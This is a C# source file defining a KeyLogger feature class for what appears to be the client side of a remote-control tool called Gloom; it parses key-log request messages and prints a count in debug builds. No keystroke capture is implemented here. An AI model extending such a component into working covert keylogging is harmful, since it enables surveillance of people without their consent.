namespace Gloom.Client.Features;
internal class KeyLogger : FeatureBase
{
	private bool active = true;

	public override Guid[] AcceptedOps => new Guid[] { OpCodes.KeyLoggerSettingRequest, OpCodes.KeyLogRequest };

	public KeyLogger(IMessageSender sender) : base(sender)
	{
	}

	public override async Task HandleAsync(Guid op, byte[] data)
	{
		if (op != OpCodes.KeyLogRequest)
			return;
		OpStructs.KeyLogRequest req = StructConvert.Bytes2Struct<OpStructs.KeyLogRequest>(data);
#if DEBUG
		Console.WriteLine("KeyLogger log receive. count=" + req.LogCount);
#endif
	}
}
